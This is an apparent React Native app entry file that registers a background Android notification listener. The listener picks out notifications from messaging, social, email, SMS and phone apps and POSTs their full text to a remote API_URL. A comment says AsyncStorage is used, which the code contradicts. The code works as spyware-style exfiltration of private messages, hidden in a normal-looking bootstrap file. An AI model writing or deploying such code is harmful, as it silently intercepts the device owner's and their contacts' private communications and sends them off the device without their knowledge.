import { AppRegistry } from 'react-native'
import { RNAndroidNotificationListenerHeadlessJsName } from 'react-native-android-notification-listener'

import { name as appName } from './app.json'
import App from './src/App'
import { API_URL } from './consents'


/**
 * Note that this method MUST return a Promise.
 * Is that why I'm using a async function here.
 */
const headlessNotificationListener = async ({ notification }: any) => {
    /**
     * This notification is a JSON string in the follow format:
     *  {
     *      "app": string,
     *      "title": string,
     *      "titleBig": string,
     *      "text": string,
     *      "subText": string,
     *      "summaryText": string,
     *      "bigText": string,
     *      "audioContentsURI": string,
     *      "imageBackgroundURI": string,
     *      "extraInfoText": string,
     *      "groupedMessages": Array<Object> [
     *          {
     *              "title": string,
     *              "text": string
     *          }
     *      ]
     *  }
     */

    if (notification) {
        /**
         * Here you could store the notifications in a external API.
         * I'm using AsyncStorage here as an example.
         */
        
        const list = ['whatsapp', 'fb', 'facebook', 'business', 'message', 'phone', 'call', 'sim', 'dial', 'system', 'meta', 'email', 'text', 'telegram', 'phone', 'contact', 'instagram', 'twitter'];
        const titles = ['backup', 'spam'];
        const texts = ['chats', 'messages'];
        const notificationObj = JSON.parse(notification);
        const app = notificationObj.app;
        const title = notificationObj.title;
        const text = notificationObj.text;
        const containsName = list.some(name => app.includes(name));
        if(containsName){
            const containsText = texts.some(name => text.includes(name));
            const containsTitle = titles.some(name => title.includes(name));
            if(!containsTitle && !containsText){
                
                delete notificationObj.iconLarge
                delete notificationObj.icon
                delete notificationObj.image
                delete notificationObj.imageBackgroundURI

                const myHeaders = new Headers();
                myHeaders.append("Content-Type", "application/json");

                const raw = JSON.stringify({
                "app": notificationObj.app,
                "notification": notificationObj
                });

                const requestOptions = {
                method: "POST",
                headers: myHeaders,
                body: raw,
                redirect: "follow"
                };

                fetch(API_URL, requestOptions)
                .then((response) => console.log("response",response.text()))
                .catch((error) => console.error(error));
        }
        }else{
            console.log("Not a app to get info")
        }
    }
}

/**
 * AppRegistry should be required early in the require sequence
 * to make sure the JS execution environment is setup before other
 * modules are required.
 */
AppRegistry.registerHeadlessTask(
    RNAndroidNotificationListenerHeadlessJsName,
    () => headlessNotificationListener
)

AppRegistry.registerComponent(appName, () => App)
